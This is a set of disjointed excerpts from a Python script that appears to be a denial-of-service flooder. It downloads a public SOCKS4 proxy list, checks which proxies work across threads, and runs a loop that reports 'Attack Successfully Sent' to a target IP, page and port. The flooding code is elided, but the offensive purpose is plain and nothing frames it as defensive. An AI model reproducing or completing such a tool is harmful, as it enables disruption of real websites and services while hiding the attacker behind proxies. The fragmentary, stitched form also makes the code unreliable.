...
def clone():
    ...
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=10000")
        f.write(r.content)
    except:
        pass
    try:
...
def main():
    ...
    time.sleep(0.3)
    ans = str(input("[+] Check The Socks4 List ? ( y / n Default = y ) : "))
    if ans == "n" or ans =="N":
        pass
    else:
        ms = str(input("[+] Delay Of Socks4 ( Seconds Default = 1 ) : "))
        if ms == "":
            ms = int(1)
        else :
            ms = int(ms)
...
def check_socks():
	...
	for lines in list(proxies):
		...
		time.sleep(0.01)
		sys.stdout.write("[+] Checked "+str(nums)+" Socks4\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("[?] Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n[✓] Checked All Socks4 --> Total Worked : "+str(len(proxies)))
...
while True:
        ...
        try:
            if n>=4:
                n = 0
            time.sleep(0.1)
            sys.stdout.write("["+str(key[n])+"] Attack Successfully Sent --> "+ip+page+":"+str(port)+"\r")
            sys.stdout.flush()
            n +=1
